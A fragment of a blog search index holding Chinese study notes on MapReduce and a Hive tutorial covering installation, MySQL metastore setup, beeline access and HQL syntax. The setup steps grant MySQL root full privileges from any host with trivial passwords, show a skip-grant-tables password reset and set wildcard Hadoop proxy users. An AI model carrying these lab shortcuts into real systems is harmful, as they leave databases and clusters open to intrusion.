      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce-简单总结]]></title>
    <url>%2F2018%2F06%2F12%2FHadoop%2F2-MapReduce%2FMapReduce-%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[MapReduce在编程的时候，基本上一个固化的模式，没有太多可灵活改变的地方，除了以下几处： 输入数据接口：InputFormat FileInputFormat (文件类型数据读取的通用抽象类) DBInputFormat （数据库数据读取的通用抽象类） 默认使用的实现类是： TextInputFormat job.setInputFormatClass(TextInputFormat.class) TextInputFormat的功能逻辑是：一次读一行文本，然后将该行的起始偏移量作为key，行内容作为value返回 逻辑处理接口： Mapper 完全需要用户自己去实现其中 map() setup() clean() map输出的结果在shuffle阶段会被partition以及sort，此处有两个接口可自定义： Partitioner 有默认实现 HashPartitioner，逻辑是根据key和numReduces来返回一个分区号:key.hashCode()&amp;Integer.MAXVALUE % numReduces 通常情况下，用默认的这个HashPartitioner就可以，如果业务上有特别的需求，可以自定义 继承 Partitioner, 重写getPartition方法, 具体见这里 Comparable 当我们用自定义的对象作为key来输出时，就必须要实现WritableComparable接口，override其中的compareTo()方法, 具体见这里 reduce端的数据分组比较接口 ： Groupingcomparator reduceTask拿到输入数据（一个partition的所有数据）后，首先需要对数据进行分组，其分组的默认原则是key相同，然后对每一组kv数据调用一次reduce()方法，并且将这一组kv中的第一个kv的key作为参数传给reduce的key，将这一组数据的value的迭代器传给reduce()的values参数 利用上述这个机制，我们可以实现一个高效的分组取最大值的逻辑： 自定义一个bean对象用来封装我们的数据，然后改写其compareTo方法产生倒序排序的效果 然后自定义一个Groupingcomparator，将bean对象的分组逻辑改成按照我们的业务分组id来分组（比如订单号） 这样，我们要取的最大值就是reduce()方法中传进来key 逻辑处理接口：Reducer 完全需要用户自己去实现其中 reduce() setup() clean() 输出数据接口： OutputFormat 有一系列子类 FileOutputformat DBoutputFormat ….. 默认实现类是TextOutputFormat 功能逻辑是： 将每一个KV对向目标文本文件中输出为一行 ​]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hive学习-1-安装]]></title>
    <url>%2F2018%2F06%2F12%2FHadoop%2F3-Hive%2FHive%E5%AD%A6%E4%B9%A0-1%2F</url>
    <content type="text"><![CDATA[Hive简介 Hive基本情况Hive 是建立在 Hadoop 上的数据仓库基础构架 由facebook开源，最初用于解决海量结构化的日志数据统 计问题; ETL(Extraction-Transformation-Loading)工具 构建在Hadoop之上的数据仓库; 数据计算使用MR，数据存储使用HDFS 数据库&amp;数据仓库 的区别： 概念上 数据库：用于管理精细化数据，一般情况下用于存储结果数据，分库分表进行存储 数据仓库：存储、查询、分析大规模数据 。更像一个打包的过程，里面存储的数据没有细化区分，粒度较粗 用途上： 数据库：OLTP，on line Transation Processing 联机事务处理，增删改 数据仓库：OLAP，on line analysis Processing 联机事务分析处理，查询，hive不支持删除、修改。 支持插入。 使用上： 数据库：标准sql, hbase: 非标准sql 数据仓库：方言版的sql， HQL 模式上： 数据库：写模式 数据仓库：读模式 可以将结构化的数据映射成一张数据库表 结构化数据映射成二维表 将文本中每一行数据映射为数据库的每一条数据 将文本中每一列数据映射为hive的表字段 提供HQL 查询功能 hive query language， 方言版sql 底层数据是存储在HDFS上 hive上建的表仅仅相当于对hdfs上的结构化数据进行映射管理 hive仅仅是一个管理数据的作用，而不会存储数据 hive想要管理hdfs上的数据，就要建立一个关联关系，关联hive上的表和hdfs上的数据路径 数据是依赖于一个元数据库 元数据库采用的是关系型数据库， 真实生产中一般使用mysql为hive的元数据库，hive内置默认的元数据库是 derby 元数据： HCalalog hive中的表和hdfs的映射关系，以及hive表属性（内部表，外部表，视图）和字段信息 元数据一旦修饰，hive的所有映射关系等都没了，就无法使用了 可与Pig、Presto等共享 Hive的是构建在Hadoop之上的数据仓库 数据计算使用MR，数据存储使用HDFS 通常用于进行离线数据处理(采用MapReduce) 可认为是一个HQL—-&gt;MR的语言翻译器 Hive优缺点： 优点： 简单，容易上手 提供了类SQL查询语言HQL 为超大数据集设计的计算/扩展能力 MR作为计算引擎，HDFS作为存储系统 统一的元数据管理(HCalalog) 可与Pig、Presto等共享 缺点 不支持 删除 &amp; 修改 delete&amp;update，不支持事务 因为是基于HDFS hive做的最多的是查询 Hive的HQL表达的能力有限 迭代式算法无法表达 有些复杂运算用HQL不易表达 Hive效率较低，查询延时高 Hive自动生成MapReduce作业，通常不够智能 HQL调优困难，粒度较粗 可控性差 Hive与传统关系型数据库(RDBMS）对比 Hive的架构 1) 用户接口 CLI：Command Line Interface，即Shell终端命令行，使用 Hive 命令行与 Hive 进行交互，最常用（学习，调试，生产），包括两种运行方式： hive命令方式：前提必须在hive安装节点上执行 hiveserver2方式：hive安装节点将hive启动为一个后台进程，客户机进行连接（类似于启动了一个hive服务端） 真实生产中常用！ - 1) 修改配置文件，允许远程连接; 第一：修改 hdfs-site.xml，加入一条配置信息，启用 webhdfs； 第二：修改 core-site.xml，加入两条配置信息，设置 hadoop的代理用户。 - 2) 启动服务进程 - 前台启动：hiveserver2 - 后台启动 - 记录日志：nohup hiveserver2 1&gt;/home/sigeon/hiveserver.log 2&gt;/home/sigeon/hiveserver.err &amp; 0：标准日志输入 1：标准日志输出 2：错误日志输出 如果我没有配置日志的输出路径，日志会生成在当前工作目录，默认的日志名称叫做： nohup.xxx - 不记录日志：nohup hiveserver2 1&gt;/dev/null 2&gt;/dev/null &amp; - [补充：] - nohup命令：no hang up的缩写，即不挂起，可以在你退出帐户/关闭终端之后继续运行相应的进程。 - 语法：nohup &lt;command&gt; &amp; - 3) 开启beenline客户端并连接： - 方法一： - beenline，开启beenline客户端; - !connect jdbc:&lt;hive2://master:10000&gt;，回车。然后输入用户名和密码，这个用户名是安装 hadoop 集群的用户名 - 方法二： - beeline -u jdbc:&lt;hive2://master:10000&gt; -n sigeon JDBC/ODBC：是 Hive 的基于 JDBC 操作提供的客户端，用户（开发员，运维人员）通过 这连接至 Hive server 服务 Web UI：通过浏览器访问 Hive，基本不会使用 2) 元数据库：保存元数据，一般会选用关系型数据库（如mysql，Hive 和 MySQL 之间通过 MetaStore 服务交互） 3) Thrift服务：Facebook 开发的一个软件框架，可以用来进行可扩展且跨语言的服务的开发， Hive 集成了该服务，能让不同的编程语言调用 Hive 的接口 4) 驱动Driver a. 解释器：解释器的作用是将 HiveSQL 语句转换为抽象语法树（AST） b. 编译器：编译器是将语法树编译为逻辑执行计划 c. 优化器：优化器是对逻辑执行计划进行优化 d. 执行器：执行器是调用底层的运行框架执行逻辑执行计划 Hive的数据组织格式 1)库：database 2) 表 a. 内部表（管理表：managed_table） b. 外部表（external_table） 内部表和外部表区别： 内部表和外部表是两个相对的概念，不可能有一个表同时是内部表又是外部表； 内部表删除表的时候会删除原始数据和元数据，而外部表删除表的时候只会删除元数据不会删除原始数据 一般情况下存储公共数据的表存放为外部表 大多数情况，他们的区别不明显。如果数据的所有处理都在 Hive 中进行，那么倾向于 选择内部表；但是如果 Hive 和其他工具要针对相同的数据集进行处理，外部表更合适。 使用外部表访问存储在 HDFS 上的初始数据，然后通过 Hive 转换数据并存到内部表中，使用外部表的场景是针对一个数据集有多个不同的 Schema。 c. 分区表 不同于hadoop中的分区，分区表是人为划分的 hive最终存储海量数据，海量数据查询一定注意避免全表扫描 查询的时候为了提升我们的查询性能，出现了分区表 将数据按照用户的业务存储到不同的目录下，在进行数据查询时只会对指定分区下的数据进行扫描一般情况下生产中用日期作为分区字段 d. 分桶表 类似于hadoop中的分区，是由程序决定的，只能指定桶的个数（分区的个数） 根据hash算法将余数不同的输出到不同的文件中 作用： 1）提升join的性能思考这个问题：select a.id,a.name,b.addr from a join b on a.id = b.id;如果 a 表和 b 表已经是 分桶表，而且分桶的字段是 id 字段做这个 join 操作时，还需要全表做笛卡尔积 2）提升数据样本的抽取效率，直接拿一个桶中的数据作为样本数据 分区表和分桶表的区别： Hive 数据表可以根据某些字段进行分区操作，细化数据管理，可以让部分查询更快。 同时表和分区也可以进一步被划分为 Buckets，分桶表的原理和 MapReduce 编程中的 HashPartitioner 的原理类似 分区和分桶都是细化数据管理，但是分区表是手动添加区分，由于 Hive 是读模式，所以对添加进分区的数据不做模式校验 分桶表中的数据是按照某些分桶字段进行 hash 散列 形成的多个文件，所以数据的准确性也高很多 3)视图： hive中的视图仅仅相当于一个sql语句的别名 在hive中仅仅存在逻辑视图，不存在物理视图 物理视图：讲sql语句的执行结果存在视图中 逻辑视图： 仅仅是对查询结果的引用 4)数据存储： 原始数据中存在HDFS 元数据存在mysql Hive安装装hive其实不难，主要是安装mysql，解决mysql的权限问题 MySql安装RPM 安装MySQl： 检查以前是否装过 MySQL 1rpm -qa|grep -i mysql 发现有的话就都卸载 12rpm -e --nodeps mysql-libs-5.1.73-5.el6_6.x86_64rpm -e --nodeps .... 删除老版本 mysql 的开发头文件和库 12rm -rf /usr/lib64/mysql# 在搜索 my.cnf 文件，有的话就删掉 上传mysql 安装包到 Linux中，解压 12345678tar -xvf mysql-5.6.26-1.linux_glibc2.5.x86_64.rpm-bundle.tar# 解压出来有这些文件MySQL-devel-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-embedded-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-shared-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-shared-compat-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-test-5.6.26-1.linux_glibc2.5.x86_64.rpm 安装 server &amp; client 1234# serverrpm -ivh MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm# clientrpm -ivh MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpm 启动Mysql 1sudo service mysql start 登录Mysql并改密码，等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# 初始密码在这个文件中cat /root/.mysql_sercert # 登录mysql -uroot -pxxxxx# 删除除了`%`之外的其他所有hostuse mysql;select host,user,password from user;delete from user where host in (&apos;localhost&apos;, &apos;127.0.0.1&apos;,&apos;::1&apos;, ...)# 修改密码 UPDATE user SET Password = PASSWORD(&apos;psd&apos;) WHERE user = &apos;root&apos;;# 为`%` 和 `*` 添加远程登录权限 #注意： 前面的 mysql 登录用户名， 123 是登录密码GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;psd&apos; WITH GRANT OPTION;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;*&apos; IDENTIFIED BY &apos;psd&apos; WITH GRANT OPTION;FLUSH PRIVILEGES;# 退出登录exit;# 此时可以再登录试试mysql -uroot -ppsd======================================# 修改字符集为 utf-8# 新建一个文件vi /etc/my.cnf # 添加以下内容[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]character-set-server=utf8# 重启mysqlsudo service mysql restart======================================# 忘记密码，修改密码的方法# 停止mysql服务的运行service mysql stop# 跳过授权表访问mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp; # 登录mysqlmysql -u root mysql # 接下来可以修改密码了 ##在mysql5.7以下的版本如下：mysql&gt; UPDATE user SET Password=PASSWORD(&apos;newpassword&apos;) where USER=&apos;root’； ##在mysql5.7版本如下：update mysql.user set authentication_string=password(&apos;newpassword&apos;) ;# 修改完了重启service mysql restart====================================== MySql的其它错误在运行schematool -dbType mysql -initSchema手动初始化元数据库的时候 报了一个log4j重复加载的问题 解决：可以不用理睬 链接mysql 密码过期问题 Your password has expired. 解决： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950mysql -uroot -p123mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select host,user,password_expired from user;+-----------+------+------------------+| host | user | password_expired |+-----------+------+------------------+| % | root | N || cs1 | root | Y || 127.0.0.1 | root | Y || ::1 | root | Y |+-----------+------+------------------+4 rows in set (0.00 sec)-------------mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;::1&apos;;Query OK, 1 row affected (0.01 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;cs1&apos;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; update user set password_expired=&apos;N&apos; where host=&apos;127.0.0.1&apos;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.00 sec)mysql&gt; select host,user,password_expired from user;+-----------+------+------------------+| host | user | password_expired |+-----------+------+------------------+| % | root | N || cs1 | root | N || 127.0.0.1 | root | N || ::1 | root | N |+-----------+------+------------------+4 rows in set (0.00 sec)mysql&gt; exitBye[ap@cs1]~/apps/hive% sudo service mysql restart# 再重新初始化就好了 Yum安装 Mysql 因为笔者没装过，所以这部分暂且不表 step2-安装HiveMySql安装好之后， 安装Hive就很简答了 注意: Hive 是操作 Mysql 的数据库, 一定要记得把 mysql 驱动文件放到 hive 下的 lib 中!!!启动beeline 前, 要把 hiveserver2开起来, 当然, hdfs, mysql 都要启动起来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# 1.上传到Linux# 2.解压安装包到安装目录tar -zxvf apache-hive-2.3.2-bin.tar.gz -C ~/apps/# 3.把MySQL驱动包(mysql-connector-java-5.1.40-bin.jar)放置在hive 的根路径下的 lib 目录，此处是 ~/apps/apache-hive-2.3.2-bin/lib# 4.修改配置文件cd ~/apps/apache-hive-2.3.2-bin/conf# 新建一个 hive-site.xmltouch hive-site.xmlvi hive-site.xml+++++++++++++++++++++++++++++++++++++++++++添加如下内容++++++++++++&lt;configuration&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; &lt;value&gt;jdbc:mysql://localhost:3306/hivedb?createDatabaseIfNotExist=true&lt;/value&gt; &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt; &lt;!-- 注意:如果mysql和hive 不在同一个服务器节点,需要使用mysql节点的 hostname 或 ip --&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; &lt;value&gt;root&lt;/value&gt; &lt;description&gt;username to use against metastore database&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; &lt;value&gt;123&lt;/value&gt; &lt;description&gt;password to use against metastore database&lt;/description&gt; &lt;/property&gt;&lt;/configuration&gt;+++++++++++++++++++++++++++++++++++++++++++添加如下内容+++++++++++ &lt;property&gt; &lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt; &lt;value&gt;/user/hive/warehouse&lt;/value&gt; &lt;description&gt;hive default warehouse, if nessecory, change it &lt;!-- 这个是配置hive在HDFS上 db 的路存储径的，不配默认默认就是上述路径 --&gt; &lt;/description&gt; &lt;/property&gt;++++++++++++++++++++++++++# 5.配置环境变量 &amp; source## 注意：ap是我的用户家目录，换上自己的用户家目录export HIVE_HOME=/home/ap/apps/apache-hive-2.3.2-bin export PATH=$PATH:$HIVE_HOME/bin# 用bash的找 .bash_profile， 配置所有环境变量source ~/.zshrc # 6.此时基本安装完成了，验证Hive安装hive --helo# 7.重点来了！ 初始化元数据库schematool -dbType mysql -initSchema&gt; 这里可能会遇到很多错误！！ &gt; 但是如果前面按照我的方法装的, 应该就问题不大了&gt; 主要是 mysql 连接权限的问题！！# 一定会出现的2个1&gt; 找不到 hive命令的一长串环境变量 (不用理会)2&gt; 两个log4j，jar包重复的问题 (不用理会)# 8.初始化完成后，可以看下数据库中有没有 hivedb 这个库，成功的话是会有的## 启动hivehive --service cli &gt;hive: show databases;# 如果能显示数据库，就没啥问题了# ❤️9.Hive的使用方式之 HiveServer2/beeline此处需要修改 hadoop 的配置文件# 9.1.首先关闭hdfs &amp; yarn服务 &amp; RunJar(hive服务)，修改hadoop配置文件# 9.2.修改 hadoop 集群的 hdfs-site.xml 配置文件:加入一条配置信息，表示启用 webhdfs&lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt;# 9.3.修改 hadoop 集群的 core-site.xml 配置文件:加入两条配置信息:表示设置 hadoop 的代理用户## 注意： 此处的ap是配置 hadoop 的用户名&lt;property&gt; &lt;name&gt;hadoop.proxyuser.ap.hosts&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;!-- 表示任意节点使用 hadoop 集群的代理用户 hadoop 都能访问 hdfs 集群 --&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.proxyuser.ap.groups&lt;/name&gt; &lt;value&gt;*&lt;/value&gt; &lt;!-- 表示代理用户的组所属 --&gt;&lt;/property&gt; 注意 修改完成后， 发给hadoop集群其他主机scp xxx.xx xxx.ss cs2:$PWDscp xxx.xx xxx.ss cs3:$PWD...# 9.4.重启hdfs &amp; yarn服务# 9.5.启动 hiveserver2 服务## 后台启动：nohup hiveserver2 1&gt;/home/ap/hiveserver.log 2&gt;/home/ap/hiveserver.err &amp; # 或者:nohup hiveserver2 1&gt;/dev/null 2&gt;/dev/null &amp;# 或者:nohup hiveserver2 &gt;/dev/null 2&gt;&amp;1 &amp;# 以上 3 个命令是等价的，第一个表示记录日志，第二个和第三个表示不记录日志注意： nohup 可以在你退出帐户/关闭终端之后继续运行相应的进程。 nohup 就是不挂起的意思(no hang up)。该命令的一般形式为:nohup command &amp;# 9.6 启动 beeline 客户端去连接方式1：执行命令:beeline -u jdbc:hive2://cs2:10000 -n ap-u : 指定元数据库的链接信息 -n : 指定用户名和密码方式2：先执行 beeline然后按图所示输入:# 此处的cs2是只安装hive的hostname!connect jdbc:hive2://cs2:10000 按回车，然后输入用户名，密码，这个 用户名就是安装 hadoop 集群的用户名和密码 登录beeline :bee:方式1: 直接登录 登录前要开启 RunJar 进程, 也就是 开启hiveserver2 nohup hiveserver2 1&gt;/home/ap/hiveserver.log 2&gt;/home/ap/hiveserver.err &amp; beeline -u jdbc:hive2://cs2:10000 -n ap 方式2: 输入用户名密码登录 !connect jdbc:hive2://cs2:10000 登录 hivehive PS: Linux环境变量失效1234# 就是直接把环境变量设置为/bin:/usr/bin，因为常用的命令都在/bin这个文件夹中。PATH=/bin:/usr/bin# 接下来修改 .bashr_profile 或则 .zshrc中的内容即可， 修改完了重新source Hive – DDL库的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 库的操作 ============================================================================#  建库 CREATE (DATABASE|SCHEMA) [IF NOT EXISTS] database_name [COMMENT database_comment][LOCATION hdfs_path][WITH DBPROPERTIES (property_name=property_value, ...)];1、创建普通库create database dbname;2、创建库的时候检查存与否create databse if not exists dbname;3、创建库的时候带注释create database if not exists dbname comment &apos;create my db named dbname&apos;;4、查看创建库的详细语句show create database mydb;#  查看库 1、查看有哪些数据库 show databases;2、显示数据库的详细属性信息语法:desc database [extended] dbname; 示例:desc database extended myhive;3、查看正在使用哪个库 select current_database();4、查看创建库的详细语句 show create database mydb;5、查看以xx开头的库show databases like &apos;s*&apos;#  删除库 删除库操作: drop database dbname; drop database if exists dbname; 默认情况下，hive 不允许删除包含表的数据库，有两种解决办法:1、 手动删除库下所有表，然后删除库2、 使用 cascade 关键字 drop database if exists dbname cascade; 默认情况下就是 restrict（严格模式）, 后2行效果一样 drop database if exists myhive drop database if exists myhive restrict#  切换库 切换库操作:- 语法:use database_name - 实例:use myhive; 表的操作创建表建表语法 CREATE [EXTERNAL] TABLE [IF NOT EXISTS] &lt;table_name&gt;创建内部表；添加EXTERNAL参数会创建外部表 (col_name data_type [COMMENT col_comment], ...)添加字段和字段描述 [COMMENT table_comment]添加表描述 [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)]指定分区字段和字段描述，分区字段不能为建表字段！ [CLUSTERED BY (col_name, col_name, ...)] SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] 指定分桶字段，分桶字段必须为建表字段！ 指定排序字段，此字段也必须为建表字段，指定的是分桶内的排序 指定分桶个数（hash后再取模） [ROW FORMAT row_format]指定分隔符，row_format 格式：列分隔符：`delimited fields terminated by ‘x&apos;` 行分隔符：`line terminated by ‘x&apos;` [STORED AS file_format]指定存储格式textfile：文本格式，默认 rcfile：行列结合格式 parquet：压缩格式 [LOCATION hdfs_path]指定表在hsfs上的存储路径，不指定的话就按配置的路径存储，如果也没指定就在hive默认的路经 /user/hive/warehouse 建表代码 a. 创建内部表 create table mytable (id int, name string) row format delimited fields terminated by &#39;,&#39; stored as textfile; b. 创建外部表 create external table mytable2 (id int, name string) row format delimited fields terminated by &#39;,&#39; location &#39;/user/hive/warehouse/mytable2&#39;; c. 创建分区表 create table table3(id int, name string) partitioned by(sex string) row format delimited fields terminated by &#39;,&#39; stored as textfile; 插入分区数据：load data local inpath &#39;/root/hivedata/mingxing.txt&#39; overwrite into table mytable3 partition(sex=&#39;girl’); 查询表分区： show partitions mytable3 d. 创建分桶表 create table stu_buck(Sno int,Sname string,Sex string,Sage int,Sdept string) clustered by(Sno) sorted by(Sno DESC) into 4 buckets row format delimited fields terminated by &#39;,’; e. 复制表 create [external] table [if not exists] new_table like table_name; f. 查询表 create table table_a as select * from teble_b; 查看表 desc &lt;table_name&gt;：显示表的字段信息 desc formatted &lt;table_name&gt;：格式化显示表的详细信息 desc extended &lt;table_name&gt;：显示表的详细信息 修改表 重命名 ALTER TABLE old_name RENAME TO new_name 修改属性 ALTER TABLE table_name SET TBLPROPERTIES (&#39;comment&#39; = &#39;my new students table’); 不支持修改表名，和表的数据存储目录 增加/修改/替换字段 ALTER TABLE table_name ADD COLUMNS (col_spec [, col_spec ...])新增的字段位置在所有列后面 ( partition 列前 ) ALTER TABLE table_name CHANGE c_name new_c_name new_c_type [FIRST | AFTER c_name]注意修改字段时，类型只能由小类型转为大类型，不让回报错；（在hive1.2.2中并没有此限制） ALTER TABLE table_name REPLACE COLUMNS (col_spec [, col_spec ...])REPLACE 表示替换表中所有字段 添加/删除分区 添加分区：ALTER TABLE table_name ADD [IF NOT EXISTS] PARTITION (partition_col = col_value1 [ ... ] ) [LOCATION &#39;location1’] 删除分区：ALTER TABLE table_name DROP [IF EXISTS] PARTITION (partition_col = col_value1 [ ... ] ) 修改分区路径：ALTER TABLE student_p PARTITION (part=&#39;bb&#39;) SET LOCATION &#39;/myhive_bbbbb’; [补充：] 1、 防止分区被删除：alter table student_p partition (part=’aa’) enable no_drop; 2、 防止分区被查询：alter table student_p partition (part=’aa’) enable offline;enable 和 disable 是反向操作 删除表 drop table if exists &lt;table_name&gt;; 清空表会保留表结构 truncate table table_name; truncate table table_name partition(city=&#39;beijing’); 其他辅助命令 a. 查看数据库列表 show databases; show databases like &#39;my*&#39;; b. 查看数据表 show tables; show tables in db_name; c. 查看数据表的建表语句 show create table table_name; d. 查看 hive 函数列表 show functions; e. 查看 hive 表的分区 show partitions table_name; show partitions table_name partition(city=&#39;beijing&#39;) f. 查看表的详细信息（元数据信息） desc table_name; desc extended table_name; g. 查看数据库的详细属性信息 desc formatted table_name; desc database db_name; desc database extended db_name; h. 清空数据表 truncate table table_name; Hive – DML装载数据 LOAD DATA [LOCAL] INPATH &#39;filepath&#39; [OVERWRITE] INTO TABLE table_name [PARTITION (partcol1=val1, partcol2=val2 ...)] 注意： LOAD 操作只是单纯的 复制（本地文件）或者 移动（hdfs文件，一般是公共数据，需要建立外部表）操作，将数据文件移动到 Hive 表对应的位置 如果指定了 LOCAL 就去本地文件系统中查找，否则按 inpath 中的 uri 在 hdfs 上查找 inpath 子句中的文件路径下，不能再有文件夹 如果使用了 OVERWRITE 关键字，则目标表（或者分区）中的内容会被删除，然后再将 filepath 指向的文件/目录中的内容添加到表/分区中。 如果目标表（分区）已经有一个文件，并且文件名和 filepath 中的文件名冲突，那么现有的文件会被新文件所替代。???不是自动重命名为xxx_copy_1 插入数据 a. 单条插入 INSERT INTO TABLE table_name VALUES(value1, value2, ...); b. 单重插入 INSERT INTO TABLE table_name [PARTITION (partcol1=val1, ...)] &lt;select_statement1 FROM from_statement&gt; c. 多重插入 FROM from_statement从基表中按不同的字段查询得到的结果分别插入不同的 hive 表只会扫描一次基表，提高查询性能 INSERT INTO TABLE table_name1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1 [WHERE where_statement] INSERT INTO TABLE table_name2 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement2 [WHERE where_statement] [ … ]; d. 分区插入 分区插入有两种：一种是静态分区，另一种是动态分区。 如果混合使用静态分区和动态分区， 则静态分区必须出现在动态分区之前。 静态分区 A)、创建静态分区表 B)、从查询结果中导入数据（单重插入）记得加载数据前要添加分区，然后指定要加载到那个分区 C)、查看插入结果 动态分区 静态分区添加数据前需要指定分区，当分区个数不确定的时候就很不方便了，这个时候可以使用动态分区 重要且常用，尤其是按照日期分区时！ A)、创建分区表 B)、参数设置 hive-1.2版本 - set hive.exec.dynamic.partition=true; //动态分区开启状态，默认开启 - set hive.exec.dynamic.partition.mode=nonstrict; //动态分区执行模式，默认&quot;strict&quot;，在这种模式 下要求至少有一列分区字段是静态的，这有助于阻止因设计错误导致查询产生大量的分区 - \# 可选设置项 如果这些参数被更改了又想还原，则执行一次 reset 命令即可 - set hive.exec.max.dynamic.partitions.pernode=100; //每个节点生成动态分区最大个数 - set hive.exec.max.dynamic.partitions=1000; //生成动态分区最大个数，如果自动分区数大于这个参数，将会报错 - set hive.exec.max.created.files=100000; //一个任务最多可以创建的文件数目 - set dfs.datanode.max.xcievers=4096; //限定一次最多打开的文件数 set - hive.error.on.empty.partition=false; //表示当有空分区产生时，是否抛出异常 - C)、动态数据插入 - 单个分区字段 - insert into table test2 partition (age) select name,address,school,age from students; - 多个分区字段 多重分区中目录结构是按照分区字段顺序进行划分的 - insert into table student_ptn2 partition(department, age) select id, name, sex, department,age from students; 分区字段都是动态的 - insert into table student_ptn2 partition(city=&apos;sa&apos;, zipcode) select id, name, sex, age, department, department as zipcode from students; 第一个分区字段时静态的，第二字department字段动态的，重命名为zipcode？ - [注意：] - 查询语句 select 查询出来的动态分区 age 和 zipcode 必须放在 最后，和分区字段对应，不然结果会出错 - D)、查看插入结果 - select * from student_ptn2 where city=&apos;sa&apos; and zipcode=&apos;MA&apos;; e. 分桶插入 A)、创建分桶表 B)、从查询结果中导入数据只能使用insert方式 C)、查看插入结果 # 几个命令 set hive.exec.reducers.bytes.per.reducer= // 设置每个reducer的吞吐量，单位byte，默认256M set hive.exec.reducers.max= //reduceTask最多执行个数，默认1009 set mapreduce.job.reduces= //设置reducetask实际运行数，默认-1，代表没有设置，即reducetask默认数为1 set hive.exec.mode.local.auto=true //设置hive本地模式 导出数据（了解） 单模式导出 INSERT OVERWRITE [LOCAL] DIRECTORY directory1 &lt;select_statement&gt;; 多模式导出 FROM from_statement INSERT OVERWRITE [LOCAL] DIRECTORY directory1 &lt;select_statement1&gt; [INSERT OVERWRITE [LOCAL] DIRECTORY directory2 &lt;select_statement2&gt;] ... 查询数据 Hive 中的 SELECT 基础语法和标准 SQL 语法基本一致，支持 WHERE、DISTINCT、GROUP BY、 ORDER BY、HAVING、LIMIT、子查询等； 1、select * from db.table1虽然可以，但是要尽量避免 select * 这样的全表扫描操作，效率太低又费时 2、select count(distinct uid) from db.table1 3、支持 select、union all、join（left、right、full join）、like、where、having、各种聚合函数、 支持 json 解析 4、UDF/ UDAF/UDTF UDF：User Defined Function，自定义函数，一对一 UDAF：User Defined Aggregate Function，自定义聚合函数，多对一，如sum()，count() UDTF ：User Defined Table Function，自定义表函数，一对多，如explode() 5、不支持 update 和 delete 6、hive 虽然支持 in/exists（老版本是不支持的），但是 hive 推荐使用 semi join 的方式来代替 实现，而且效率更高。 半连接 左半连接：left semi join，以左表为基表，右表有的，只显示左表相应记录（即一半） 右半连接：right semi join，与左半连接相反 内连接：inner join，两表中都有的才会连接 外连接 左外连接：left outer join，坐标为基表，右表有的会关联，右表没有的以null表示；左表没有右表有的不会关联 右外连接：right outer join，与左外连接相反 全外连接：full outer join，两表合并 7、支持 case … when … 语法结构 SELECT [ALL | DISTINCT] select_ condition, select_ condition, ... FROM table_name a [JOIN table_other b ON a.id = b.id]表连接 [WHERE where_condition]过滤条件 [GROUP BY col_list [HAVING condition]]分组条件 [CLUSTER BY col_list | [DISTRIBUTE BY col_list] [SORT BY col_list | ORDER BY col_list] [DESC]]排序条件：\1. order by：全局排序，默认升序，DESC表示降序。只有一个 reduce task 的结果，比如文件名是 000000_0，会导致当输入规模较大时，需要较长的计算时间。\2. sort by：局部排序，其在数据进入 reducer 前完成排序。因此，如果用 sort by 进行排序，并且设置 mapred.reduce.tasks &gt; 1，则 sort by 只保证每个 reducer 的输出有序，不保证全局有序。\3. distribute by：类似于分桶，根据指定的字段将数据分到不同的 reducer，且分发算法是 hash 散列\4. cluster by：除了具有 Distribute by 的功能外，还会对该字段进行排序。注意：如果 distribute 和 sort 字段是同一个时，cluster by = distribute by + sort 